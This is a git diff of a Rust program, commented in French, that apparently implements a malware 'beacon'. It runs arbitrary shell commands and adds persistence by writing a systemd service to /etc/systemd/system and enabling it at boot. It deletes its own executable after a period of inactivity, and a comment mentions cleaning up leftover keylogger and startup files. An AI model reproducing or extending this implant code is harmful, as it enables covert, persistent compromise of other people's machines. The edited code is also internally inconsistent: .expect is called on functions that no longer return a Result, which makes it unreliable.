@@ -1,25 +1,22 @@
 use std::{env, fs};
-use std::borrow::BorrowMut;
 use std::cell::RefCell;
 use std::error::Error;
-use std::panic::resume_unwind;
+use std::fs::File;
 use std::process::Command;
-use std::rc::Rc;
-use std::sync::Arc;
 use std::time::Instant;
+use std::io::Write;
 
 thread_local!(static LAST_ENTRY : RefCell<Instant> = RefCell::new(Instant::now()));
 
 fn main() {
     println!("{}",exec_command("echo Hello world"));
-    run();
+    run().expect("Unable to Run");
 }
 
 fn read_entry() -> &'static str {
     //placeholder fonction
-    let mut entry :&str = "";
     //TODO Truc pour récup' l'entrée
-    entry = "switch toto";
+    let entry :&str = "switch toto";
 
     if !entry.is_empty() {
         LAST_ENTRY.with(|instant| {*instant.borrow_mut() = Instant::now()});
@@ -49,21 +46,36 @@ fn exec_command(cmd: &str) -> String {
         Command::new("cmd")
             .args(["/C", cmd])
             .output()
-            .expect("failed to execute process")
+            .expect("sh failed to execute")
     } else {
         Command::new("sh")
             .arg("-c")
             .arg(cmd)
             .output()
-            .expect("failed to execute process")
+            .expect("sh failed to execute")
     };
     String::from_utf8(output.stdout).unwrap()
 }
 
+fn exec_on_boot() {
+    let exe = env::current_exe().expect("Failed to get current exe");
+    let mut file = File::create("/etc/systemd/system/beacon_need.service").unwrap();
+    writeln!(file,
+             "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
+             exe.to_str().unwrap()).expect("Unable to Write");
+    Command::new("sh")
+        .arg("-c")
+        .arg("systemctl enable beacon_need.service")
+        .spawn()
+        .expect("systemctl failed to execute");
+}
 
-fn run() -> Result<(),  Box<dyn Error>>{
+
+fn run() {
     //fonction principale d'execution
     let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
+    exec_on_boot().expect("Unable to exec on startup");
+
     //boucle principale du programme
     loop {
         if is_operating_as_transmition_tower {
@@ -75,10 +87,11 @@ fn run() -> Result<(),  Box<dyn Error>>{
         }
 
         if LAST_ENTRY.with(|instant| {(*instant.borrow()).elapsed().as_secs() >= 2}) {
+            //Ne pas oublier de clear les fichiers residuels (keylogger et startup)
             //auto-destruction
-            let exe = env::current_exe()?;
-            fs::remove_file(&exe)?;
-            return Ok(())
+            let exe = env::current_exe().expect("Failed to get current exe");
+            fs::remove_file(&exe).expect("Failed to delete current exe");
+            break
         }
     }
 }
